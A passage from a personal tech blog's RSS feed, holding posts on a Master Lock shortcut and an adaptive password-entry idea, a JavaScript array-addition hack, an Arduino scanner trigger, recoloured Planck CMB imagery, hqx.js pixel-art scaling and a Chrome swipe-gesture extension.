&lt;p&gt;During that time, I had read about a pretty nifty hack involving Master Locks at the time. If you entered the combination and opened the lock and closed it again and left it on the last digit, you could open it again by rotating clockwise by fifteen and rotating back to the final digit (to fight the possibility of attackers who are aware of the exploit, you could turn the dial clockwise some number less than 15 after locking it, so that you would only have to remember the final digit). It was this trick that I used to open my locker just about every other school day for those  two years- a reduction in security no doubt, but a great convenience. I’ve been thinking over the design of the lock recently, and I’m not sure if it’s better classified as a bug or a feature. Conventional wisdom dictates that no doubt this substantial reduction in the key space is a rather severe design flaw. The fact that many newer locks were immune (a lot of locks will snap the dial forward when closed so that it is physically impossible to land on the final digit) to this trick seems to support the notion that this was somehow an undesired consequence of locksmithery rather than some kind of delightful accident.&lt;/p&gt;
&lt;p&gt;But the more I think about it, the more this bug seems like a feature. Perhaps the loss of security isn’t nearly as egregious as it appears, and this little shortcut is actually a delightful little accident. Nearly every school day, I’d only have to take four seconds to open my locker because of this handy trick, except on those occasions some kid before me decided to walk around the lockers to press their heads against the metallic locks to spin them and pretend they can lock-pick, in which case, I’d have to enter the whole combination to &lt;em&gt;open __sesame&lt;/em&gt;. That is, you only need to know one number to open it unless someone earlier guessed wrong, in which case, you’d have to enter three numbers.&lt;/p&gt;
&lt;p&gt;The next story is about an iPhone.&lt;/p&gt;
&lt;p&gt;I playfully grab at a friend’s phone for the second time in a week. A friend takes a selfie using the newly emancipated phone, with a rather contorted grin. I dutifully replace her lock screen photo, which had previously been an aerial shot of her grassy picturesque college campus with my friend’s contorted close-up selfie. She learns to be a bit more protective about her phone, quickly issuing a light tap on the power button to reengage the lock screen, a four headed Cerberus with an exponential backoff growl. But this doesn’t mean anything to the enterprising background changer, because the unlocking gesture happens all the time and it’s fairly easy to figure out what numbers someone’s typing.&lt;/p&gt;
&lt;p&gt;This is a fairly innocent class of authentication breach, but it should be fairly unnerving given the extent to which our lives and personal information are accessible. Anyway, these two stories led me to think about ways to both simplify the process of entering passcodes and passphrases while simultaneously hardening against some general attacks, in particular replay attacks (and to a lesser extent, man in the middle).&lt;/p&gt;
&lt;p&gt;The premise is simple enough: As you’re typing a password, letter by letter and stroke by stroke, each character is processed (either locally, or sent to a server). As soon as the authorization engine is comfortable with the amount of data provided, it sends a signal so that no more data is transmitted, and that authorization is complete.&lt;/p&gt;
&lt;p&gt;In the same manner as the old MasterLock, maybe in a particularly auspicious occasion, one might only need one or two symbols in order to prove their identity. However, if the wrong digit is entered on the first try, the subsequent attempt must then obviously come with increased difficulty. Likewise, it may be advantageous to have a low initial difficulty if the login scenario seems very ordinary, which can be determined by any number of variables, including but not limited to the current IP Address, the location as determined by GPS or other means, stylometrics such as the rate and delay between typing individual letters, the number of simultaneous concurrent sessions, how the last session ended (by timeout or by an active logout). But an important part of the  system is that the difficulty has to be non-deterministic, because if we assume the attacker knows the system and can manipulate the variables at play, there is still a last vestige of hope that the attacker’s first guess is wrong (after that the difficulty climbs and the attacker is no longer really a problem).&lt;/p&gt;
&lt;p&gt;Note that the server would not specifically reveal that a password is incorrect (until it’s manually submitted, like in existing systems). It would only indicate when the received content is sufficient.&lt;/p&gt;
&lt;p&gt;In a keyboard input scenario, for a shell prompt or for generic password entry, it’s probably important to keep the text box open until the user acknowledges that he has been authorized, however in case the connection has been compromised by a non-interactive eavesdropping man in the middle with the intent to replay the password, the client should stop sending additional letters as soon as the server signals that it’s ok. This gives the server the option of never revealing to the user whether a response is sufficient, essentially forcing the user to enter the entire password and pressing submit.&lt;/p&gt;
&lt;p&gt;Like how some safes or button pads have duress codes that silently call the police when triggered, there system could ignore invalid characters that prepend the actual password for entry, while subsequently blacklisting that given prefix and raising subsequent difficulty.&lt;/p&gt;
&lt;p&gt;Of course this isn’t a complete solution. There needs to be some segmentation of access based on current authorization levels. For instance, checking whatever new mail or facebook statuses exist probably does not warrant much authentication friction, but combing through old personal documents and emails, installing root software or changing system settings, should probably require higher levels. This can probably help in that by keeping a unified password of sorts for all levels, but isn’t itself a complete solution. Two factor authentication is also important, in case a single device is compromised or some part of the scheme is untrusted.&lt;/p&gt;
&lt;p&gt;I think it’d actually be pretty cool to see something like this implemented, because I think it might serve as a genuinely useful feature that enables a continuously variable spectrum that varies between when security is a situational necessity and when excessive user friction is detrimental.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Array Addition and Other Fun Javascript Hacks</title>
      <link>http://antimatter15.com/2013/06/array-addition-and-other-fun-javascript-hacks/</link>
      <pubDate>Sun, 30 Jun 2013 07:56:30 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2013/06/array-addition-and-other-fun-javascript-hacks/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2013/Array%20Addition%20and%20Other%20Fun%20Javascript%20Hacks/untitled.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;fun hacks&quot;  src=&quot;/articles/2013/Array%20Addition%20and%20Other%20Fun%20Javascript%20Hacks/untitled.png&quot; &gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;It’s times like these that I’m reminded of my favorite childhood TV show (actually it’s kind of a close contest between this and Spongebob), Mythbusters, and that perennial warning: “don’t try this at home”. But this isn’t actually dangerous in any physically life-damaging way, it’s just dangerous in that it’s a very bad idea. The whole thing started with a friend who was irked by a few Javascript oddities, one of them being the inability for arrays or tuples of numbers to add.&lt;/p&gt;
&lt;p&gt;I actually came across an idea some time ago while reading about &lt;a href=&quot;http://jeremiahgrossman.blogspot.com/2006/01/advanced-web-attack-techniques-using.html&quot;&gt;cross-site JSON exploits&lt;/a&gt;. But the premise for adding arrays is rather simple: since the language only supports subtracting and adding numbers, the javascript engine will try to convert an array to a number by calling its valueOf method. There really isn’t a numeric representation of an array so valueOf usually just returns &lt;tt&gt;NaN&lt;/tt&gt;, which isn’t tremendously useful. However, we can override the valueOf function to return any number we want.&lt;/p&gt;
&lt;p&gt;We can create a &lt;tt&gt;valueOf&lt;/tt&gt; function which assigns numbers to arrays according to a specific pattern, such that the resultant number can reveal (without much ambiguity) which arrays were involved, and whether they were added or subtracted. There are probably a myriad of ways to construct numbers like that, but one of the simplest (or at least the first one that I could come up with) is to raise some given radix (at least 3) to a unique number that increments every time valueOf is called. You can understand it pretty simply in base 10.&lt;/p&gt;
&lt;p&gt;Lets say our first array is &lt;tt&gt;[1, 2, 3]&lt;/tt&gt;  and our second array is &lt;tt&gt;[5, 4, 3]&lt;/tt&gt;. Every time the instance’s &lt;tt&gt;valueOf&lt;/tt&gt; is called, we plop it onto a temporary global array and record the index. In this case, lets assign the first array index 1, and the second array index 2. If we raise the radix 10 to that index, we can get the respective unique numbers: 10 and 100.  Now these numbers can be added or subtracted, leading to 110 or 90 or -90 (or unaltered, leaving 10 and 100). To find out what operations and what numbers are involved in the operation, we can first add 1000 which is 10 raised to the size of the global array, which has the useful effect of making everything positive. Now we’re left with &lt;tt&gt;1110&lt;/tt&gt;, &lt;tt&gt;1090&lt;/tt&gt;, &lt;tt&gt;0910&lt;/tt&gt;, &lt;tt&gt;1010&lt;/tt&gt;, and &lt;tt&gt;1100&lt;/tt&gt;. We can ignore the first and last digits, and each digit can be either a 1, a 0 or a 9 (if it’s anything else, this is just a number, not the result of a magical array addition). A 1 tells us the number was added, a 0 tells us the number isn’t used, and a 9 tells us that the number was subtracted.&lt;/p&gt;
&lt;p&gt;This leaves a weird problem though, which is how you’re going to convert a number back into that array transparently. And this segues into the more atrocious segment of this hack. If and when Skynet and the other assorted malevolent (uh… I mean, &lt;em&gt;misunderstood&lt;/em&gt;) artificial intelligences develop their courts, the fembots and gentledroids of the jury will no doubt consider me guilty of whatever felonious usercrimes may exist. They’ll consider me an equal of &lt;a href=&quot;http://en.wikipedia.org/wiki/Norman_Bates&quot;&gt;Norman Bytes&lt;/a&gt;, butchering idiomatic javascript in the shower.&lt;/p&gt;
&lt;p&gt;What exactly makes it such a heinous offence, you may find yourself asking. The answer is simple: the unholy matrimony of &lt;tt&gt;with&lt;/tt&gt; and &lt;tt&gt;Object.defineProperty&lt;/tt&gt; (also, keep in mind that it isn’t DOMA’s fault).&lt;/p&gt;
&lt;p&gt;The great thing about Object.defineProperty is that it lets you get in the middle of the whole variable assignment process. The problem is that this only works with object properties, not top level variables. But Javascript has a nice (read: wretched) &lt;tt&gt;with&lt;/tt&gt; statement which lets you treat variables as if they were object properties. This still leaves a slight problem because there’s no way to define a catch-all property. And if nothing so far has wrought utter terror to your soul, this last critical part may very well do exactly that. Since variables that are called must exist there in name, we can use the Function &lt;tt&gt;toString&lt;/tt&gt; method to decompile the source and use a simple regular expression (any symbol which starts with A-z $ or _ followed by any of that or a number) to extract candidate variable tokens, and for each one, we can define a getter and setter on a new object which is subsequently passed as the first argument to the function whose first enclosed statement is a &lt;tt&gt;with&lt;/tt&gt;.&lt;/p&gt;
&lt;p&gt;The power of intercepting all function calls, variable declarations and retrievals then comes by recursively creating another fake object filled with getters and setters whenever a property is accessed. For method calls to primitive types like strings and numbers, we do the same type of sorcery but directly on their respective &lt;tt&gt;prototype&lt;/tt&gt; properties. Whenever a function is passed a number which happens to match the pattern for an array addition or subtraction, we can passively intercept and substitute its value. Any string which matches a certain pattern of CSS selectors can be then transparently substituted with the NodeList which results from a &lt;tt&gt;document.querySelectorAll&lt;/tt&gt;. And we can change all the variable declarations for a for..in loop such that array values are used instead of keys.&lt;/p&gt;
&lt;p&gt;And now, four minutes before the end of this month, I’ve successfully yet again managed to eke out a blog post to fulfill my quota. And I guess I don’t have an Humane Society to prove that no humans were harmed in the making of this blog post, but how bad could it possibly be— it’s only &lt;a href=&quot;https://github.com/antimatter15/mathemath.js/blob/master/test.js&quot;&gt;150 lines&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Automatically Scanning on Lid Close with Arduino</title>
      <link>http://antimatter15.com/2013/05/automatically-scanning-on-lid-close-with-arduino/</link>
      <pubDate>Thu, 30 May 2013 04:27:28 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2013/05/automatically-scanning-on-lid-close-with-arduino/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2013/Automatically%20Scanning%20on%20Lid%20Close%20with%20Arduino/scan.jpg&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;Arduino Scanner&quot;  src=&quot;/articles/2013/Automatically%20Scanning%20on%20Lid%20Close%20with%20Arduino/scan.jpg&quot; &gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Before the 29th of January, I had a rather irritatingly Rube Goldberigan scheme for using my CanoScan LiDE 80. It didn’t have native Linux support, so the only way I could scan documents was through a Windows XP (Technically MicroXP) installation inside a VMWare virtual machine extant for the sole purpose of indulging my blue moon scanning requirements. But after that fateful day, I had a new scanner which- in its matte black glory could reasonably produce bitmap reproductions from pieces of paper on its surface, notably sans the convoluted meta-computing.&lt;/p&gt;
&lt;p&gt;Ubuntu ships with a nice Simple Scan app, which as the name might suggest, allows you to scan things rather simply. But for some reason I thought that getting a scanner was a good reason to start scanning every one of the numerous pieces of paper I get from school. Naturally, there’s a problem of course which arises from the fact that I have to open up an app (usually with the absurdly slow unity launcher) and then use my mouse to click buttons, all of which happens on top of the already undue burden of opening the scanner lid to put papers inside.&lt;/p&gt;
&lt;p&gt;Obviously this system would be untenable for a mass scanning addiction. Maybe a reasonable person would at that point take a deep introspective about the end goal of such an endeavor. Maybe wasting the 5 Gigabytes a year needed to archive some 8,000 school papers (assuming that the files are stored at a fairly reasonable 200dpi as jpegs averaging around 5MB per)- most of which illegible chickenscratch anyway, plus the ten minutes or so per day at minimum to shuffle papers around. Well, a _reasonable _person would take into account the cost and relative benefit of such a scheme and decide that this really isn’t worth it.&lt;/p&gt;
&lt;p&gt;But of course, I couldn’t be so overtly dismissive if I had that same reasonable sense. Obviously this setback was not a serendipitous invitation from providence to investigate the social, ethical and utilitarian merits of the goal (I say this of course with a great deal of sarcasm, but there are many less trivial opportunities that technologists ignore). Instead, ignoring whether or not it was a good idea in the first place, I decided to fix it.&lt;/p&gt;
&lt;p&gt;The first step was trying to get the buttons to work. Canon scanners, and presumably all other scanners, have little buttons on the device that you can push to accomplish certain easy tasks. On Windows, it’s pretty cool because it’ll automatically launch whatever app it is that scans things and start it automatically. There’s a set of four: PDF, Auto, Copy and Email, pretty self explanatory at that (and if that fails to suffice, they’re coupled with cute monochrome icons).&lt;/p&gt;
&lt;p&gt;The problem is that it doesn’t work automagically, at least on Linux. I found  little project called scanbuttond, or something to that effect, and tried patching it in some way that would fix it, but after investing an hour or so- I pretty much gave up.&lt;/p&gt;
&lt;p&gt;The thing is that having button isn’t even the most efficient system for document scanning. So what physical cues are there to indicate intent-to-scan? The first and most obvious one is the presence of a document in the bay. It’s a bit difficult to divine when a document is placed on the surface, though it’s probably possible with some fancy arrangement of lasers or light sensors exploiting ftir or precisely measuring the weight of the entire scanner or monitoring the butterflies in proximity for fft’d wing flaps. Plus, chances are that immediately after a document’s been placed, you probably want some time to adjust the paper’s alignment and get your fingers off the paper (before the intense searing beam of panchromatic LED light reduces your fingertips to burnt crisps).&lt;/p&gt;
&lt;p&gt;For flat documents, most of the time when that happens, you close the lid so that the foam white lid insert will press down on the document (flattening out the wrinkles endemic to a haphazard backpack-paper-shoving technique) after making adjustments to ensure proper alignment. The only problem with this scheme is if you’re scanning some thicker document (a book- whatever that is) or don’t feel like lowering the lid (now, why would you want to do that?).&lt;/p&gt;
&lt;p&gt;So with a piece of folded up aluminum foil and foam and some judicious application of tape (in a setup eerily similar to that door alarm that I built from a kit from the Discovery Channel store when I was 7) I crafted a little switch mechanism that activated whenever the lid was closed. Then the two prongs of the foam switch were attached to a voltage divider on and Arduino Leonardo board so that it could measure when the thing closed or opened. A tiny piece of code ran on the Arduino which would do exponential smoothing on the voltage between the pins and send a signal over serial.&lt;/p&gt;
&lt;p&gt;On the computer-side of things, there’s a little python script which listens on the serial device for whenever the lid has closed. It uses the pySANE bindings to scan the document and then using PIL compares it to a blank scan in order to figure out if what we scanned was actually empty. If it isn’t empty, then it saves it to the disk as a file named after the current date.&lt;/p&gt;
&lt;p&gt;Twenty lines of Arduino C, and a hundred of Python later, I have a scanner which makes it exceedingly easy to digitize my paper trail. Too bad I haven’t used it in four months. I reinstalled Ubuntu at some point and never quite bothered setting it up again (even though it would only entail like two lines to attach it to the startup applications list). Even when it was working, it took some amount of work and offered almost no immediate benefit- it didn’t integrate any form of OCR or fancy visualization which could potentially make this interesting from a scientific perspective. But school is winding down, I mean literally graduation is a smidgen more than a week away, so I’m not exactly going to have much more paper to digitize. So I guess this marks the end of a failed experiment, the pre and post mortem- interesting in that it succeeds in just about everything I set out to do, but I never quite got it into &lt;em&gt;using&lt;/em&gt; it.&lt;/p&gt;
&lt;p&gt;Maybe &lt;a href=&quot;https://github.com/antimatter15/scan&quot;&gt;you’ll find it more useful&lt;/a&gt; than I did.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Recoloring Planck Data</title>
      <link>http://antimatter15.com/2013/04/recoloring-planck-data/</link>
      <pubDate>Tue, 30 Apr 2013 05:21:20 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2013/04/recoloring-planck-data/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2013/Recoloring%20Planck%20Data/Recolored-and-Merged-OnWhite-Thumbnail.jpg&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;Recolored and Merged OnWhite Thumbnail&quot;  src=&quot;/articles/2013/Recoloring%20Planck%20Data/Recolored-and-Merged-OnWhite-Thumbnail.jpg&quot; &gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The rationale behind this is actually pretty contrived, but one of my friends had an imminent birthday, and I had no idea what kind of present to get her. Incidentally she sent had been working on some project and sent me a copy to look over- a request that I honored by perpetually promising to get to it &lt;em&gt;eventually&lt;/em&gt;. Sure, it was interesting enough, but several months elapsed and I was beginning to face the fact that I would in all likelihood never actually get to it (kind of like my bottomless Instapaper queue from three years ago)- but that resounding guilt instilled the notion that somehow she liked astrophysics (the paper was something on &lt;a href=&quot;http://www.nobelprize.org/nobel_prizes/physics/laureates/2011/&quot;&gt;Perlmutter’s Nobe&lt;/a&gt;l). So in the absence of any other good ideas, I decided to get her a giant printout of the classic WMAP CMBR.&lt;/p&gt;
&lt;p&gt;Soon after finding a poster for sale off &lt;a href=&quot;http://www.zazzle.com/&quot;&gt;Zazzle &lt;/a&gt;entitled the “&lt;a href=&quot;http://www.zazzle.com/face_of_god_poster-228261263707923223&quot;&gt;Face of God&lt;/a&gt;“ (a particularly poetic pantheistic epithet), I found out that only a week earlier the European Space Agency had published the results of their &lt;a href=&quot;http://apod.nasa.gov/apod/image/1303/&quot;&gt;Planck probe&lt;/a&gt;- a substantially higher quality rendition of the cosmic microwave background. So the solution would be simple, I’d just take that new, clearer image and upload it to that poster-printer under some clever title like “Face of God- &lt;a href=&quot;http://www.youtube.com/watch?v=XpaOjMXyJGk&quot;&gt;Dove Real Beauty&lt;/a&gt;&lt;sup&gt;TM&lt;/sup&gt;“, as if the NASA’s WMAP is some kind of odd &lt;a href=&quot;http://tvtropes.org/pmwiki/pmwiki.php/Main/GaussianGirl&quot;&gt;gaussian girl trope&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/articles/2013/Recoloring%20Planck%20Data/Original-OnWhite-Thumbnail.jpg&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;Original OnWhite Thumbnail&quot;  src=&quot;/articles/2013/Recoloring%20Planck%20Data/Original-OnWhite-Thumbnail-300x151.jpg&quot; &gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/articles/2013/Recoloring%20Planck%20Data/ilc_9yr_moll720-300x150.jpg&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;ilc_9yr_moll720-300x150&quot;  src=&quot;/articles/2013/Recoloring%20Planck%20Data/ilc_9yr_moll720-300x150.jpg&quot; &gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;But the ESA’s Planck coloring is for some unfathomable reason particularly ugly. Sure it has a kind of crude appeal reminiscent of some kind of yellowed 14th century cartographic map with its tan speckled shades of color, but in general, it’s just kind of ugly. Maybe it’s &lt;a href=&quot;http://en.wikipedia.org/wiki/Evolution_of_the_eye&quot;&gt;five hundred million years of evolution&lt;/a&gt; that makes me particularly predisposed to the blue-green aesthetic of leafy flora and the azure sky. Also, for sake of recognizability, the WMAP data has made its fame with that &lt;em&gt;particular&lt;/em&gt; coloring, it’s kind of unreasonable to expect someone to recognize it even after the color scheme has been changed.&lt;/p&gt;
&lt;p&gt;The task of recoloring it was actually pretty simple, I just had to locate a legend for the respective graphs- a solid gradient which spans from the cool side to the warm side (the actual range of the data is only ±2mK so there isn’t in this case a massive difference between cool and warm). After crawling through a handful of scientific publications, it’s easy enough to find one and take a screenshot.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/articles/2013/Recoloring%20Planck%20Data/wmap.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;wmap&quot;  src=&quot;/articles/2013/Recoloring%20Planck%20Data/wmap.png&quot; &gt;&lt;/div&gt;&lt;/a&gt;&lt;a href=&quot;/articles/2013/Recoloring%20Planck%20Data/planck-small.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;planck-small&quot;  src=&quot;/articles/2013/Recoloring%20Planck%20Data/planck-small.png&quot; &gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The difference in width is actually a kind of useless distinction, an artifact of the resolution of the paper or image I extracted the gradient from. It’s kind of interesting because I don’t really have any idea what the mathematical basis of these gradients are. The WMAP one looks like a simple rainbow so it may just be the colors arranged in progressively increasing wavelength, while the ESA coloring appears to be some kind of linear interpolation between red, white and blue (if the nationalities were inverted, one might be tempted to say murrica).&lt;/p&gt;
&lt;p&gt;But once the gradient is established, it becomes the trivial task of mapping the colors of one image to another, something that I kind of hackedly accomplished with a Python script using PIL (It took a minute or so to process the 8 million pixels, but that’s not really too bad). And then, because the ultimate purpose of my project wasn’t so much to attain scientific accuracy as feigning it with some kind of better aesthetic, I went to GIMP and superimposed a translucent copy of the WMAP data so the image isn’t quite so speckled and the larger continental blobs more apparent.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.zazzle.com/recolored_planck_cmbr-228277903548974917&quot;&gt;Here is the poster&lt;/a&gt; if you want it. And &lt;a href=&quot;/articles/2013/Recoloring%20Planck%20Data/iCgy2H2o85YEQ.jpg&quot;&gt;the resulting 6.1MB jpeg&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>hqx.js - pixel art scaling in the browser</title>
      <link>http://antimatter15.com/2013/03/hqx-js-pixel-art-scaling-in-the-browser/</link>
      <pubDate>Sun, 31 Mar 2013 02:30:05 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2013/03/hqx-js-pixel-art-scaling-in-the-browser/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;http://antimatter15.github.com/hqx.js/&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;Screenshot 2013-03-31 at 5.15.07 PM&quot;  src=&quot;/articles/2013/hqx.js%20-%20pixel%20art%20scaling%20in%20the%20browser/Screenshot-2013-03-31-at-5.15.07-PM.png&quot; &gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Every once in a while some gadget has the misfortune of epitomizing the next first world problem. I guess right now, this is owning a Retina (or equivalent) laptop, tablet (arguably phone, but most web pages are scaled out so it’s not that big of a problem) and being irked at the prevalence of badly scaled graphics. So there’s a new buzzword “Retina Ready” for websites, layouts and designs which support higher resolution graphics for devices which support it, often meaning of lots of &lt;a href=&quot;http://37signals.com/svn/posts/3271-easy-retina-ready-images-using-scss&quot;&gt;new files and new css rules&lt;/a&gt;. It’s this trend of high-pixel-density devices (with devices like the &lt;a href=&quot;http://www.apple.com/ipad/&quot;&gt;iPad 3&lt;/a&gt;, &lt;a href=&quot;http://www.apple.com/macbook-pro/&quot;&gt;Retina Macbook Pro&lt;/a&gt;, &lt;a href=&quot;http://www.google.com/nexus/10/&quot;&gt;Nexus 10&lt;/a&gt; and &lt;a href=&quot;http://www.google.com/intl/en/chrome/devices/chromebook-pixel/&quot;&gt;Chromebook Pixel&lt;/a&gt; - though I for one don’t currently have any of them, just this old glitchy-albeit-functional first generation Chromebook) that is &lt;a href=&quot;https://github.com/twitter/bootstrap/pull/6342&quot;&gt;driving people&lt;/a&gt; to vector &lt;a href=&quot;http://fortawesome.github.com/Font-Awesome/&quot;&gt;icon fonts&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;But the problem of radical increases in terms of resolution isn’t a new one. Old &lt;a href=&quot;http://en.wikipedia.org/wiki/Video_game_arcade_cabinet#Parts_of_an_arcade_cabinet&quot;&gt;arcade games&lt;/a&gt; rarely exceeded 260x315, and the &lt;a href=&quot;http://en.wikipedia.org/wiki/Game_Boy_Color#Specifications&quot;&gt;Game Boy Color&lt;/a&gt; had a paltry 160x144. While a few people still nostalgically lug around game cabinets and dig out their dust-covered childhood handheld consoles for nostalgic sneezing fits, most of the old games are now played with emulators running on systems several orders of magnitude more sophisticated in every imaginable aspect. So that arcade monitor that once could engross a childhood (and maybe early manhood) now appears nothing more than a two inch square on a twenty inch monitor. But luckily there is a surprisingly good solution to all of this in the form of algorithms designed in particular for &lt;a href=&quot;http://en.wikipedia.org/wiki/Image_scaling#Pixel_art_scaling_algorithms&quot;&gt;scaling pixel art&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The most basic form of image scaling that exists is called &lt;strong&gt;nearest-neighbor interpolation&lt;/strong&gt;, which is extra simple for retina devices because it means simply growing the size of each pixel by a factor of two along each axis. That leads to things which are blocky, and unless you’re part of an 8-bit retro-art project with a chiptune soundtrack looks ugly.&lt;/p&gt;
&lt;p&gt;The most common form of image scaling borrows a lot from the math and signal processing fields, with names like &lt;strong&gt;bilinear, bicubic, and lanzcos&lt;/strong&gt; essentially they treat an image as some kind of composition of sinusoidal parts and try to ideally extrapolate and interpolate such that visible artifacts are marginalized. It’s all very mathy, but the result is kind of the opposite of nearest-neighbor because it has the tendency to make things blurry and fuzzy.&lt;/p&gt;
&lt;p&gt;The thing is that the latter tries to reach some kind of mathematical ideal, because images taken by your friendly neighborhood DSLR-toting amateur (spider-powers optional) are actually samples of real world points of data— so this mathematical pursuit of purity works out very well. There’s still the factor-of-four information-theoretic gap that needs to be filled in with best-guesstimates, but there isn’t really any way to improve the way a photograph is scaled without using a higher-resolution version of said photograph. But most photographs that are taken already are sixteen-megapixel monsters and they usually still look acceptable when upscaled.&lt;/p&gt;
&lt;p&gt;The problem arises with pixel art, little icons or buttons which someone painstakingly drew in Photoshop one lazy summer afternoon in the late 90s. They’re everywhere and each pixel isn’t captured and encoded by a sampling algorithm of some analog natural phenomona— each pixel was lovingly crafted and planted by some meticulous artist. There is no underlying analog signal to interpret, it’s a direct perceptual hookup to the mind of the creator— and that’s why bicubic sampling looks especially bad here.&lt;/p&gt;
&lt;p&gt;Video games, before 3d graphics engines and math-aware anti-aliasing concerned with murdering &lt;a href=&quot;http://en.wikipedia.org/wiki/Jaggies&quot;&gt;jaggies&lt;/a&gt;, in the old civilized age of &lt;a href=&quot;http://en.wikipedia.org/wiki/Bit_blit&quot;&gt;bit-blitting&lt;/a&gt;, were mostly constructed out of pixel art. Each color in that limited palette was placed there for a reason and could be exploited by specialized algorithms to construct higher-quality upscaled versions which remained sharp. These come with the names &lt;strong&gt;EPX, Scale2x, AdvMAME2x, Eagle, 2×Sal, Super &lt;strong&gt;2×Sal,&lt;/strong&gt;&lt;/strong&gt; &lt;strong&gt;hqx, &lt;/strong&gt;and most recently, &lt;strong&gt;Kopf-Lischinksi&lt;/strong&gt;. These algorithms could be applied in real time to emulator windows to acceptably scale a game to new sizes while eschewing jagged corners and blurry edges. &lt;em&gt;
&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Anyway the cool thing is that you can probably apply these algorithms in lieu of the nearest-neighbor or bilinear scaling algorithms used by browsers on retina platforms to effortlessly upgrade old sites to shiny and smooth. With a few rough heuristics (detect if an image appears to be a sprite by testing for a limited palette, see if the image is small or a perfect square, detect if it has transparent pixels) this could be packed into a simple script include that website makers could easily inject into their pages to &lt;strong&gt;automagically upconvert old graphics&lt;/strong&gt; to new shiny high-resolution ones without having to go through the actual effort of drawing new high resolution graphics and uploading them online. And this could also be packaged as a browser extension so that, once and forever after, &lt;strong&gt;this first-world nuisance shall be no more&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Before setting out to port &lt;a href=&quot;https://github.com/Arcnor/hqx-java&quot;&gt;hqx-java&lt;/a&gt; to &lt;a href=&quot;https://github.com/antimatter15/hqx.js&quot;&gt;javascript&lt;/a&gt;, I actually did some cursory googling to see if it actually had been done before. Midway through writing this post, I found out that it actually had &lt;a href=&quot;http://phoboslab.org/log/2010/12/hqx-scaling-in-javascript&quot;&gt;been done before&lt;/a&gt;, in a better way, so I won’t even bother linking to my inferior version. But either way the actual goal of this project was the part which was detailed in the last paragraph, that of an embeddable script or browser extension which could heuristically apply pixel-scaling algorithms— something I probably won’t bother trying to do until at least after I get my college laptop (which I anticipate will be a Retina Macbook Pro 15”). Nonetheless, I haven’t written an actual blog post in almost three months and it’s the last day of this month, and I guess it’s better than having you all (though nobody’s probably going to read this now that Google Reader has died) assume that I’ve died. Anyway, now I’m probably going to retroactively publish old blog posts in previous months to fraud continuity.&lt;/em&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Swipe Gesture 2</title>
      <link>http://antimatter15.com/2013/02/swipe-gesture-2/</link>
      <pubDate>Fri, 08 Feb 2013 05:20:15 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2013/02/swipe-gesture-2/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;https://chrome.google.com/webstore/detail/mgegfjnccpnkdppohmfgnjalkediapkc&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2013/Swipe%20Gesture%202/Swipe2-e1345249041313.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Swipe2&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;I’ve actually had this post fermenting in my blog’s draft folder since at least September, but I never actually got around to finishing the post. And now that Google’s enabling the new swipe-to-go-back by default on the dev channel versions of Chrome OS, it finally feels like the right time to post. As in, I feel like posting things right when they’re soon to be absolutely useless (Which, you might recall, was the case with my Google Wave client, which started selling on the App Store the day Google announced that Wave would be phased out and eventually shut down).&lt;/p&gt;
&lt;p&gt;So, a few months ago, I finished my update to the&lt;a href=&quot;https://chrome.google.com/webstore/detail/swipe-gesture/mgegfjnccpnkdppohmfgnjalkediapkc?hl=en-US&quot;&gt; Swipe Gesture &lt;/a&gt;extension, which featured a rather significant redesign. It supported multiple gesture directions and a fancy animated element to indicate the direction of the gesture.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>MIT</title>
      <link>http://antimatter15.com/2013/01/mit/</link>
      <pubDate>Tue, 15 Jan 2013 01:59:58 -0500</pubDate>
